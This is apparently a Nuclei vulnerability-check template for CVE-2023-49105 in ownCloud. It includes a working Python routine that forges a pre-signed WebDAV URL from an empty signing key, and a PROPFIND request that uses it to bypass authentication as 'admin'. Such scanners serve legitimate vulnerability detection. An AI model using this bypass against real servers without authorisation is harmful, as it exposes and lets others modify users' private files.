id: cve-2023-49105

info:
  author: ChristianPoeschl, FlorianDewald, usdAG
  description: Checks CVE-2023-49105 in Owncloud which allows unauthenticated file access and modification
  name: CVE-2023-49105
  severity: high
  tags: owncloud,http,safe,cve-2023-49105,cve


variables:
  username: admin


code:
  - engine:
      - py
      - python3
    source: |
      # build signature for presigned urls
      import base64, hashlib, datetime, os
      from urllib.parse import urlencode

      username = os.getenv('username')
      base_url = os.getenv('BaseURL')
      dav_url = f'{base_url}/remote.php/dav/files/{username}'
      oc_date = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')
      data = {
        'OC-Expires': '991200',
        'OC-Verb': 'PROPFIND',
        'OC-Credential': username,
        'OC-Date': oc_date
      }
      sig_url = f'{dav_url}?{urlencode(data)}'
      # derive signature from empty sign key
      dk = hashlib.pbkdf2_hmac('sha512', sig_url.encode(), b'', 10000, dklen=32)
      final_url = f'/remote.php/dav/files/{username}?{urlencode(data)}&OC-Signature={dk.hex()}'
      #final_url = f'{sig_url}&OC-Signature={dk.hex()}'
      print(final_url)

    extractors:
      - type: regex
        internal: true
        name: signed_url
        regex:
          - '.*'

http:
  - raw:
    - |
      PROPFIND {{signed_url}} HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/xml
      Authorization: Basic {{base64('{{username}}')}}

    matchers-condition: or
    matchers:
      - type: status
        name: bypass-correct-user
        status:
          - 207

      - type: word
        name: bypass-wrong-user
        part: body
        condition: and
        words:
          - 'User unknown'
          - 'Sabre'
          - 'Exception'
          - 'NotAuthenticated'
